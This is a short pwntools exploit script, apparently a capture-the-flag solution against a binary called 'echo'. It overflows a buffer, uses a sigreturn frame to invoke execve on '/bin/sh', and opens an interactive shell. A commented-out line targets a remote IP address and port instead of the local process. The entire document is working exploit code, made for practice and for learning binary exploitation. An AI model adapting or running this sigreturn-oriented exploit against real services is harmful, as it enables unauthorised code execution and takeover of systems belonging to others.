from pwn import *
context.log_level = 'debug'
context.arch = "amd64"
sh = process('./echo')
# 
# sh = remote('185.172.165.118',9090)
# gdb.attach(sh)
# pause()
syscall = 0x40104C
bin_sh = 0x401035
echo = 0x401000
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_execve
sigframe.rdi = bin_sh
sigframe.rsi = 0x0
sigframe.rdx = 0x0
sigframe.rip = syscall
payload = 'a' * 15
payload = payload.ljust(0x188,'b') 
payload += p64(echo) + p64(syscall) + str(sigframe)
sh.sendline(payload)
# 
sh.sendline('a' * 14)
sh.interactive()